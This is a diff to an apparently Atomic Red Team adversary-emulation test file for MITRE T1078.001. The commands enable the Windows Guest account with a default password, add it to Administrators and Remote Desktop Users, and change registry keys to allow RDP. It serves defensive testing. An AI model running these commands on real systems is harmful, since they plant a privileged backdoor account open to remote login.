@@ -1,9 +1,11 @@
 attack_technique: T1078.001
 display_name: 'Valid Accounts: Default Accounts'
 atomic_tests:
-- name: Enable Guest account with RDP capability and admin priviliges
+- name: Enable Guest account with RDP capability and admin privileges
   auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
-  description: After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group, and desktop will allow multiple RDP connections
+  description: |
+    After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
+    and desktop will allow multiple RDP connections.
   supported_platforms:
   - windows
   input_arguments:
@@ -15,19 +17,54 @@ atomic_tests:
       description: Specify the guest password
       type: String
       default: Password123!
+    local_admin_group:
+      description: Specify the admin localgroup name
+      type: String
+      default: Administrators
+    remote_desktop_users_group_name:
+      description: Specify the remote desktop users group name
+      type: String
+      default: Remote Desktop Users
+    remove_rdp_access_during_cleanup:
+      description: Set to 1 if you want the cleanup to remove RDP access to machine
+      type: Integer
+      default: 0
   executor:
     command: |-
       net user #{guest_user} /active:yes
       net user #{guest_user} #{guest_password}
-      net localgroup administrators #{guest_user} /add
-      net localgroup "Remote Desktop Users" #{guest_user} /add
+      net localgroup #{local_admin_group} #{guest_user} /add
+      net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /add
       reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
       reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
     cleanup_command: |-
       net user #{guest_user} /active:no >nul 2>&1
-      net localgroup administrators #{guest_user} /delete >nul 2>&1
-      net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
-      reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
-      reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
+      net localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1
+      net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /delete >nul 2>&1
+      if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
+      if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
+      if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
     name: command_prompt
     elevation_required: true
+
+- name: Activate Guest Account
+  auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+  description: |
+    The Adversaries can activate the default Guest user. The guest account is inactivated by default
+  supported_platforms:
+  - windows
+  input_arguments:
+    guest_user:
+      description: Specify the guest account
+      type: String
+      default: guest
+  executor:
+    command: |
+     net user #{guest_user} /active:yes
+    cleanup_command: |
+     net user #{guest_user} /active:no
+    name: command_prompt
+    elevation_required: true
+
+
+
